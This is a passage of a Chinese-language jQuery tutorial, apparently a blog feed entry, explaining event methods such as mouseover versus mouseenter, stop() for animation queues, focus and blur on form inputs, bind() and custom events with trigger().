punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>元素相对于选择器的<code>index</code></li></ol><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$(selector).index(element)// 指定要获得 index 位置的元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h2 id="jQuery-事件"><a href="#jQuery-事件" class="headerlink" title="jQuery 事件"></a><code>jQuery</code> 事件</h2><blockquote><p>页面对不同访问者的响应叫事件.常见的事件有:</p><table><thead><tr><th>事件</th><th>解释</th></tr></thead><tbody><tr><td><code>click()</code></td><td>鼠标点击事件</td></tr><tr><td><code>dblclick()</code></td><td>鼠标双击事件</td></tr><tr><td><code>mouseover()</code></td><td>鼠标进入(进入子元素也会触发)</td></tr><tr><td><code>mouseout()</code></td><td>鼠标离开(离开子元素也会触发)</td></tr><tr><td><code>mouseenter()</code></td><td>鼠标进入(进入子元素不会触发)</td></tr><tr><td><code>mouseleave()</code></td><td>鼠标离开(离开子元素不会触发)</td></tr><tr><td><code>hover()</code></td><td><code>mouseenter,mouseleave</code> 的集合</td></tr><tr><td><code>mouseup()</code></td><td>放开鼠标</td></tr><tr><td><code>mousedown()</code></td><td>按下鼠标</td></tr><tr><td><code>mousemove()</code></td><td>鼠标在元素内部移动</td></tr></tbody></table><hr><table><thead><tr><th>事件</th><th>解释</th></tr></thead><tbody><tr><td><code>blur()</code></td><td>元素失去焦点</td></tr><tr><td><code>focus()</code></td><td>元素获取焦点</td></tr><tr><td><code>change()</code></td><td>元素的值发生变化</td></tr><tr><td><code>keyup()</code></td><td>松开键盘</td></tr><tr><td><code>load()</code></td><td>元素加载完毕</td></tr><tr><td><code>ready()</code></td><td><code>DOM</code> 加载完毕</td></tr><tr><td><code>resize()</code></td><td>浏览器窗口发生变化</td></tr><tr><td><code>submit()</code></td><td>提交表单</td></tr><tr><td><code>unload()</code></td><td>用户离开页面</td></tr></tbody></table></blockquote><h3 id="1-mouseover-mouseenter-区别"><a href="#1-mouseover-mouseenter-区别" class="headerlink" title="1.mouseover(),mouseenter() 区别"></a>1.<code>mouseover(),mouseenter()</code> 区别</h3><blockquote><p>利用动画效果观察,但是这里有个问题,就是<code>jQuery</code> 的内部维护了一个动画效果的队列,每次的鼠标的运动,都会造成一次事件,事件会加入到队列中,如果鼠标移动过快,就会造成动画一直在动.</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>事件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">     <span class="token selector">body </span><span class="token punctuation">{</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.box</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">200</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">200</span>px<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> grey<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">200</span>px auto <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">     <span class="token comment" spellcheck="true">// 利用 动画效果实现 鼠标事件</span>     <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 因为jQuery的动画效果自己维护了一个队列,所以鼠标进入和出去都算一次事件</span>         <span class="token comment" spellcheck="true">// 如果鼠标进入离开的过快,就会造成动画效果一直自动运行,直到队列清空</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseover</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                 <span class="token string">'margin-top'</span><span class="token punctuation">:</span> <span class="token number">150</span>             <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                 <span class="token string">'margin-top'</span><span class="token punctuation">:</span> <span class="token number">200</span>             <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用<code>stop()</code> 方法停止动画,修改如下:</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">// 使用 stop() 方法<script>     // 利用 动画效果实现 鼠标事件     $(function() {         // 因为jQuery的动画效果自己维护了一个队列,所以鼠标进入和出去都算一次事件         // 如果鼠标进入离开的过快,就会造成动画效果一直自动运行,直到队列清空         $('.box').mouseover(function() {             $(this).stop().animate({ // stop()会停止所有动画,然后再去执行最后一次                 'margin-top': 150             });         });         $('.box').mouseout(function() {             $(this).stop().animate({                 'margin-top': 200             });         });     }) </script><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>区别:</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>事件<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">     <span class="token selector">body </span><span class="token punctuation">{</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.box</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">200</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">200</span>px<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> grey<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">200</span>px auto <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.box1</span> </span><span class="token punctuation">{</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> lightblue<span class="token punctuation">;</span>         <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>         <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">     <span class="token comment" spellcheck="true">// 利用 动画效果实现 鼠标事件</span>     <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token comment" spellcheck="true">// 因为jQuery的动画效果自己维护了一个队列,所以鼠标进入和出去都算一次事件</span>         <span class="token comment" spellcheck="true">// 如果鼠标进入离开的过快,就会造成动画效果一直自动运行,直到队列清空</span>         <span class="token comment" spellcheck="true">// $('.box').mouseover(function() {</span>         <span class="token comment" spellcheck="true">//     $(this).animate({ // stop()会停止所有动画,然后再去执行最后一次</span>         <span class="token comment" spellcheck="true">//         'margin-top': 150</span>         <span class="token comment" spellcheck="true">//     });</span>         <span class="token comment" spellcheck="true">// });</span>         <span class="token comment" spellcheck="true">// $('.box').mouseout(function() {</span>         <span class="token comment" spellcheck="true">//     $(this).animate({</span>         <span class="token comment" spellcheck="true">//         'margin-top': 200</span>         <span class="token comment" spellcheck="true">//     });</span>         <span class="token comment" spellcheck="true">// });</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseenter</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                 <span class="token string">'margin-top'</span><span class="token punctuation">:</span> <span class="token number">150</span>             <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseleave</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                 <span class="token string">'margin-top'</span><span class="token punctuation">:</span> <span class="token number">200</span>             <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token comment" spellcheck="true">&lt;!-- 添加一个子元素 --></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>box1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="2-焦点事件"><a href="#2-焦点事件" class="headerlink" title="2.焦点事件"></a>2.焦点事件</h3><blockquote><p>当通过鼠标点击选中元素,或者通过<code>tab</code> 定位到元素时,该元素就会获得焦点.</p><p><code>focus(),blur(),change()</code> 常用于表单的<code>input()</code> 框.</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">     <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                 <span class="token string">'background-color'</span><span class="token punctuation">:</span> <span class="token string">'#ccc'</span>             <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">blur</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                 <span class="token string">'background-color'</span><span class="token punctuation">:</span> <span class="token string">'#fff'</span>             <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>邮箱:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>btn1<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>密码:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-绑定事件bind"><a href="#3-绑定事件bind" class="headerlink" title="3.绑定事件bind()"></a>3.绑定事件<code>bind()</code></h3><blockquote><p>语法:</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$(selector).bing(event, data, function, map)// event,必须,绑定到元素的一个或多个事件,用空格符号分隔// data 可选,传递到函数的额外数据// function 必须,回调函数// map 可选,事件映射<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"mouseover mouseout"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toggleClass</span><span class="token punctuation">(</span><span class="token string">"intro"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css"><span class="token selector"><span class="token class">.intro</span></span><span class="token punctuation">{</span>    <span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">150%</span><span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span>red<span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>将鼠标移动到该段落上。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="4-自定义事件"><a href="#4-自定义事件" class="headerlink" title="4.自定义事件"></a>4.自定义事件</h3><blockquote><p>可使用<code>jquery</code>对象上的<code>trigger</code>方法来触发对象上绑定的事件.</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">//给element绑定hello事件element.bind("hello",function(){ alert("hello world!");});//触发hello事件element.trigger("hello");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> jQuery </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javascript </tag>
            
            <tag> jquery </tag>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
